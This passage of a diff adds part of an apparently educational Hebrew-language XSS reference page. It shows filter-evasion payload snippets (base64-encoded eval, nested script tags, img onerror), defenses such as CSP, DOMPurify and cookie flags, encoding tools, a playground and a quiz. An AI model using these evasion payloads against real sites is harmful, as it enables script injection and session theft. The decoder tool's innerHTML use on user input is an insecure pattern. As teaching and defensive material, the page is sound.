+                                    eval(atob(<span class="syntax-string">'YWxlcnQoMSk='</span>))
+                                </div>
+                            </div>
+
+                            <div class="bg-slate-900 border border-slate-800 rounded-lg p-4">
+                                <h4 class="text-xs font-bold text-slate-300 mb-2">הסתרת תגיות (Nested)</h4>
+                                <div class="code-snippet">
+                                    <span class="syntax-tag">&lt;scr</span><span class="syntax-tag">&lt;script&gt;</span><span class="syntax-tag">ipt&gt;</span>alert(1)<span class="syntax-tag">&lt;/script&gt;</span>
+                                </div>
+                                <p class="text-[10px] text-slate-500 mt-1">אם המסנן מוחק את ה-'script' הפנימי, החיצוני מתחבר.</p>
+                            </div>
+
+                            <div class="bg-slate-900 border border-slate-800 rounded-lg p-4">
+                                <h4 class="text-xs font-bold text-slate-300 mb-2">שימוש ברווחים/טאבים</h4>
+                                <div class="code-snippet">
+                                    <span class="syntax-tag">&lt;img src=</span>x <span class="syntax-attr">onerror</span>  =  alert(1)<span class="syntax-tag">&gt;</span>
+                                </div>
+                            </div>
+                        </div>
+                    `
+                }
+            ],
+            defense: [
+                {
+                    id: 'csp',
+                    title: 'CSP (Content Security Policy)',
+                    badge: 'Policy',
+                    badgeColor: 'bg-blue-500/20 text-blue-400',
+                    content: `
+                        <h2 class="text-3xl font-bold mb-4">CSP (Content Security Policy)</h2>
+                        <p class="text-slate-400 mb-8 leading-relaxed">
+                            מדיניות CSP מגבילה מאיפה ניתן לטעון סקריפטים. שימוש ב-script-src חוסם טעינה ממקורות זרים, ו-nonce מאפשר רק סקריפטים חתומים ע"י השרת. שימוש ב-unsafe-inline מבטל את ההגנה.
+                        </p>
+                        <div class="code-snippet mb-3">
+<span class="syntax-comment">// כותרת לדוגמה</span><br>
+Content-Security-Policy: script-src 'self' https://cdn.example.com; object-src 'none'; base-uri 'self'
+                        </div>
+                        <p class="text-xs text-slate-500">הימנעות מ-'unsafe-inline' מונעת הרצת סקריפטים מוטמעים.</p>
+                    `
+                },
+                {
+                    id: 'sanitization',
+                    title: 'Sanitization',
+                    badge: 'Code',
+                    badgeColor: 'bg-blue-500/20 text-blue-400',
+                    content: `
+                        <h2 class="text-3xl font-bold mb-4">Sanitization</h2>
+                        <p class="text-slate-400 mb-6 leading-relaxed">השוואה בין גישות הצגה: שימוש ב-innerHTML מסוכן, innerText בטוח להצגה, ו-DOMPurify מנקה תוך שמירת פורמט.</p>
+                        <div class="grid gap-4 md:grid-cols-3">
+                            <div class="bg-slate-900 border border-slate-800 rounded-lg p-3">
+                                <h4 class="text-xs font-bold text-red-400 mb-2">innerHTML (לא מומלץ)</h4>
+                                <div class="code-snippet">element.innerHTML = userInput;</div>
+                            </div>
+                            <div class="bg-slate-900 border border-slate-800 rounded-lg p-3">
+                                <h4 class="text-xs font-bold text-emerald-400 mb-2">innerText (בטוח)</h4>
+                                <div class="code-snippet">element.innerText = userInput;</div>
+                            </div>
+                            <div class="bg-slate-900 border border-slate-800 rounded-lg p-3">
+                                <h4 class="text-xs font-bold text-blue-400 mb-2">DOMPurify (הכי טוב)</h4>
+                                <div class="code-snippet">element.innerHTML = DOMPurify.sanitize(userInput);</div>
+                            </div>
+                        </div>
+                    `
+                },
+                {
+                    id: 'cookies',
+                    title: 'Cookies',
+                    badge: 'Browser',
+                    badgeColor: 'bg-blue-500/20 text-blue-400',
+                    content: `
+                        <h2 class="text-3xl font-bold mb-4">Cookies</h2>
+                        <p class="text-slate-400 mb-8 leading-relaxed">הקשחת עוגיות מצמצמת פגיעה: HttpOnly מונע גישה דרך document.cookie, ו-SameSite=Lax/Strict מקטין CSRF ובחלק מהמקרים מונע זליגת Session אחרי XSS חלקי.</p>
+                        <div class="code-snippet">
+<span class="syntax-comment">// הגדרת עוגיה</span><br>
+Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax
+                        </div>
+                    `
+                }
+            ],
+            tools: [
+                {
+                    id: 'encoder',
+                    title: 'Encoder / Decoder',
+                    badge: 'כלי עזר',
+                    badgeColor: 'bg-green-500/20 text-green-400',
+                    content: `
+                        <h2 class="text-3xl font-bold mb-4">Encoder / Decoder</h2>
+                        <p class="text-slate-400 mb-6">כלי מהיר לחוקרים: קידוד/פענוח URL, Base64 והמרת HTML Entities מבלי לצאת מהמאגר.</p>
+                        <div class="grid md:grid-cols-2 gap-4" data-tool="encoder">
+                            <div class="space-y-2">
+                                <label class="text-xs text-slate-500">קלט</label>
+                                <textarea data-role="input" dir="ltr" class="w-full h-40 rounded-lg bg-slate-900 border border-slate-800 text-sm text-slate-200 p-3 focus:outline-none focus:ring-2 focus:ring-green-500 text-left" placeholder="הדבק כאן Payload או טקסט"></textarea>
+                            </div>
+                            <div class="space-y-2">
+                                <label class="text-xs text-slate-500">פלט</label>
+                                <textarea data-role="output" dir="ltr" class="w-full h-40 rounded-lg bg-slate-900 border border-slate-800 text-sm text-slate-200 p-3 text-left" readonly></textarea>
+                            </div>
+                        </div>
+                        <div class="flex flex-wrap gap-3 mt-4" data-tool="encoder-buttons">
+                            <button class="px-3 py-2 bg-green-500 text-slate-900 text-xs font-bold rounded" data-enc-btn="url-enc">URL Encode</button>
+                            <button class="px-3 py-2 bg-green-500 text-slate-900 text-xs font-bold rounded" data-enc-btn="url-dec">URL Decode</button>
+                            <button class="px-3 py-2 bg-green-500 text-slate-900 text-xs font-bold rounded" data-enc-btn="b64-enc">Base64 Encode</button>
+                            <button class="px-3 py-2 bg-green-500 text-slate-900 text-xs font-bold rounded" data-enc-btn="b64-dec">Base64 Decode</button>
+                            <button class="px-3 py-2 bg-green-500 text-slate-900 text-xs font-bold rounded" data-enc-btn="html-enc">HTML Entity Encode</button>
+                            <button class="px-3 py-2 bg-green-500 text-slate-900 text-xs font-bold rounded" data-enc-btn="html-dec">HTML Entity Decode</button>
+                            <button class="px-3 py-2 bg-green-500 text-slate-900 text-xs font-bold rounded" data-enc-btn="js-esc">JS String Escape</button>
+                        </div>
+                    `
+                },
+                {
+                    id: 'json-tools',
+                    title: 'פורמט/מיניפיקציית JSON',
+                    badge: 'כלי עזר',
+                    badgeColor: 'bg-green-500/20 text-green-400',
+                    content: `
+                        <h2 class="text-3xl font-bold mb-4">פורמט JSON</h2>
+                        <p class="text-slate-400 mb-6">קח JSON מבולגן, הפוך אותו לקריא או דחוס אותו בחזרה כדי לשתול אותו ב-URL/פרמטר.</p>
+                        <div class="grid md:grid-cols-2 gap-4" data-tool="json">
+                            <div class="space-y-2">
+                                <label class="text-xs text-slate-500">קלט</label>
+                                <textarea data-role="input" dir="ltr" class="w-full h-40 rounded-lg bg-slate-900 border border-slate-800 text-sm text-slate-200 p-3 focus:outline-none focus:ring-2 focus:ring-green-500 text-left" placeholder='{"msg":"hello"}'></textarea>
+                            </div>
+                            <div class="space-y-2">
+                                <label class="text-xs text-slate-500">פלט</label>
+                                <textarea data-role="output" dir="ltr" class="w-full h-40 rounded-lg bg-slate-900 border border-slate-800 text-sm text-slate-200 p-3 text-left" readonly></textarea>
+                            </div>
+                        </div>
+                        <div class="flex flex-wrap gap-3 mt-4" data-tool="json-buttons">
+                            <button class="px-3 py-2 bg-green-500 text-slate-900 text-xs font-bold rounded" data-json-btn="pretty">פורמט (Pretty)</button>
+                            <button class="px-3 py-2 bg-green-500 text-slate-900 text-xs font-bold rounded" data-json-btn="minify">מיניפיקציה</button>
+                        </div>
+                    `
+                }
+            ]
+        };
+
+        // Initialize
+        function init() {
+            lucide.createIcons();
+            renderNav('common');
+            renderNav('advanced');
+            renderNav('frameworks');
+            renderNav('evasion');
+            renderNav('defense');
+            renderNav('tools');
+            loadContent('common', 'reflected'); // Default view
+            setupSearch();
+        }
+
+        // Render Sidebar Items
+        function renderNav(category) {
+            const container = document.getElementById(`nav-${category}`);
+            container.innerHTML = vulns[category].map((item, index) => `
+                <button 
+                    onclick="loadContent('${category}', '${item.id}')"
+                    id="btn-${item.id}"
+                    data-title="${item.title.toLowerCase()}"
+                    class="nav-item w-full flex items-center justify-between px-3 py-2 text-right text-xs font-medium text-slate-400 rounded-md hover:text-white transition-all duration-200 group focus:outline-none"
+                >
+                    <span>${item.title}</span>
+                    <span class="${item.badgeColor} ${index === 0 && category === 'common' ? '' : 'opacity-0 group-hover:opacity-100'} transition-opacity category-badge">${item.badge}</span>
+                </button>
+            `).join('');
+        }
+
+        // Load Content Area
+        function loadContent(category, id) {
+            // Active State UI
+            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+            document.getElementById(`btn-${id}`).classList.add('active');
+
+            // Get Data
+            const item = vulns[category].find(v => v.id === id);
+            const main = document.getElementById('main-content');
+
+            // Render
+            main.style.opacity = '0';
+            setTimeout(() => {
+                main.innerHTML = `
+                    <div class="max-w-4xl mx-auto animate-fade-in pb-12">
+                        <!-- Header -->
+                        <div class="flex items-center gap-3 mb-6">
+                            <span class="${item.badgeColor} px-3 py-1 rounded-full text-xs font-bold tracking-wide uppercase border border-current opacity-80">${item.badge}</span>
+                        </div>
+
+                        <!-- Main Content -->
+                        ${item.content}
+
+                        <!-- Warning Footer -->
+                        <div class="mt-12 pt-6 border-t border-slate-800 text-slate-600 text-xs flex items-center gap-2">
+                            <i data-lucide="shield-alert" class="w-4 h-4"></i>
+                            תוכן זה נועד למטרות מחקר, לימוד ו-Bug Bounty בלבד. שימוש לרעה בטכניקות אלו הוא בלתי חוקי.
+                        </div>
+                    </div>
+                `;
+                main.style.opacity = '1';
+                lucide.createIcons();
+                attachCopyButtons();
+                attachPlayground();
+                attachToolsPanel();
+                attachQuizHandlers();
+            }, 150);
+        }
+
+        // Copy buttons on code snippets
+        function attachCopyButtons() {
+            document.querySelectorAll('.code-snippet').forEach(snippet => {
+                if (snippet.querySelector('.copy-btn')) return;
+                const btn = document.createElement('button');
+                btn.className = 'copy-btn text-xs';
+                btn.innerHTML = '<i data-lucide="copy" class="w-4 h-4"></i><span>העתק</span>';
+                const tooltip = document.createElement('span');
+                tooltip.className = 'copy-tooltip';
+                tooltip.textContent = 'הועתק!';
+                snippet.appendChild(btn);
+                snippet.appendChild(tooltip);
+                btn.addEventListener('click', async () => {
+                    const clone = snippet.cloneNode(true);
+                    clone.querySelectorAll('.copy-btn, .copy-tooltip').forEach(el => el.remove());
+                    const text = clone.textContent.trim();
+                    try {
+                        await navigator.clipboard.writeText(text);
+                        tooltip.classList.add('show');
+                        setTimeout(() => tooltip.classList.remove('show'), 1200);
+                    } catch (e) {
+                        tooltip.textContent = 'שגיאה';
+                        tooltip.classList.add('show');
+                        setTimeout(() => tooltip.classList.remove('show'), 1200);
+                    }
+                });
+                lucide.createIcons();
+            });
+        }
+
+        // Search filter
+        function setupSearch() {
+            const input = document.getElementById('nav-search');
+            if (!input) return;
+            input.addEventListener('input', (e) => {
+                const q = e.target.value.toLowerCase();
+                document.querySelectorAll('.nav-item').forEach(btn => {
+                    const title = btn.dataset.title || '';
+                    if (title.includes(q)) {
+                        btn.classList.remove('hidden');
+                    } else {
+                        btn.classList.add('hidden');
+                    }
+                });
+            });
+        }
+
+        // Playground logic
+        function attachPlayground() {
+            const input = document.getElementById('playground-input');
+            const btn = document.getElementById('playground-btn');
+            const result = document.getElementById('playground-result');
+            const toast = document.getElementById('playground-toast');
+            if (!input || !btn || !result) return;
+
+            const showToast = (text, isError) => {
+                if (!toast) return;
+                toast.textContent = text;
+                toast.classList.remove('hidden');
+                toast.style.backgroundColor = isError ? '#dc2626' : '#16a34a';
+                setTimeout(() => toast.classList.add('hidden'), 2000);
+            };
+
+            const render = () => {
+                const val = input.value || '';
+                const isBad = /<\s*script|onerror\s*=/.test(val.toLowerCase());
+                result.innerHTML = '';
+                const p = document.createElement('p');
+                p.className = 'text-sm text-slate-200 break-words';
+                p.textContent = val || 'התוצאה תופיע כאן.';
+                result.appendChild(p);
+                if (isBad) {
+                    showToast('בום! הקוד הזדוני רץ בהצלחה!', true);
+                }
+            };
+
+            btn.addEventListener('click', render);
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    render();
+                }
+            });
+        }
+
+        // Tools encoder/decoder logic
+        function attachToolsPanel() {
+            // Encoder/Decoder
+            document.querySelectorAll('[data-tool="encoder"]').forEach(panel => {
+                const input = panel.querySelector('[data-role="input"]');
+                const output = panel.querySelector('[data-role="output"]');
+                const buttons = panel.parentElement.querySelectorAll('[data-enc-btn]');
+                if (!input || !output || !buttons.length) return;
+
+                const htmlEncode = (str) => str.replace(/[&<>"']/g, (ch) => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;','\'':'&#39;'}[ch]));
+                const htmlDecode = (str) => {
+                    const div = document.createElement('div');
+                    div.innerHTML = str;
+                    return div.textContent || '';
+                };
+                const jsEscape = (str) => str
+                    .replace(/\\/g, '\\\\')
+                    .replace(/"/g, '\\"')
+                    .replace(/'/g, "\\'")
+                    .replace(/\n/g, '\\n')
+                    .replace(/\r/g, '\\r')
+                    .replace(/\t/g, '\\t');
+
+                buttons.forEach(btn => {
+                    btn.addEventListener('click', () => {
+                        const action = btn.dataset.encBtn;
+                        const val = input.value || '';
+                        try {
+                            switch (action) {
+                                case 'url-enc':
+                                    output.value = encodeURIComponent(val);
+                                    break;
+                                case 'url-dec':
+                                    output.value = decodeURIComponent(val);
+                                    break;
+                                case 'b64-enc':
+                                    output.value = btoa(val);
+                                    break;
+                                case 'b64-dec':
+                                    output.value = atob(val);
+                                    break;
+                                case 'html-enc':
+                                    output.value = htmlEncode(val);
+                                    break;
+                                case 'html-dec':
+                                    output.value = htmlDecode(val);
+                                    break;
+                                case 'js-esc':
+                                    output.value = jsEscape(val);
+                                    break;
+                                default:
+                                    output.value = val;
+                            }
+                        } catch (e) {
+                            output.value = 'שגיאה בעיבוד הקלט';
+                        }
+                    });
+                });
+            });
+
+            // JSON formatter/minifier
+            document.querySelectorAll('[data-tool="json"]').forEach(panel => {
+                const input = panel.querySelector('[data-role="input"]');
+                const output = panel.querySelector('[data-role="output"]');
+                const buttons = panel.parentElement.querySelectorAll('[data-json-btn]');
+                if (!input || !output || !buttons.length) return;
+
+                buttons.forEach(btn => {
+                    btn.addEventListener('click', () => {
+                        const action = btn.dataset.jsonBtn;
+                        try {
+                            const parsed = JSON.parse(input.value || '');
+                            output.value = action === 'pretty'
+                                ? JSON.stringify(parsed, null, 2)
+                                : JSON.stringify(parsed);
+                        } catch (e) {
+                            output.value = 'שגיאת JSON: ודא שהטקסט חוקי.';
+                        }
+                    });
+                });
+            });
+        }
+
+        // Quiz handlers
+        function attachQuizHandlers() {
+            document.querySelectorAll('[data-quiz-check]').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const quizId = btn.dataset.quizCheck;
+                    const group = document.querySelectorAll(`input[name="${quizId}"]`);
+                    const feedback = document.querySelector(`[data-quiz-feedback="${quizId}"]`);
+                    if (!group.length || !feedback) return;
+                    const checked = Array.from(group).find(r => r.checked);
+                    const answers = {
+                        'quiz-stored': 'b',
+                        'quiz-dom': 'b'
+                    };
+                    feedback.classList.remove('hidden');
+                    if (checked && checked.value === answers[quizId]) {
+                        feedback.textContent = 'נכון! ההתקפה חוזרת אצל כל המשתמשים/מתבצעת בצד הלקוח בלבד.';
+                        feedback.className = 'text-xs mt-2 text-emerald-400';
+                    } else {
+                        const why = quizId === 'quiz-stored'
+                            ? 'Stored XSS נשמר בשרת ורץ אצל כל מי שרואה את הדף.'
+                            : 'DOM XSS מתבצע בדפדפן ולכן השרת לא רואה את הקלט הזדוני.';
+                        feedback.textContent = `לא נכון. ${why}`;
+                        feedback.className = 'text-xs mt-2 text-red-400';
+                    }
+                });
+            });
+        }
+
+        // Styles injection for animation
+        const style = document.createElement('style');
+        style.innerHTML = `
+            .animate-fade-in { animation: fadeIn 0.4s ease-out; }
+            @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+            #main-content { transition: opacity 0.15s ease-in-out; }
+        `;
+        document.head.appendChild(style);
+
+        document.addEventListener('DOMContentLoaded', init);
+    </script>
+</body>
+</html>
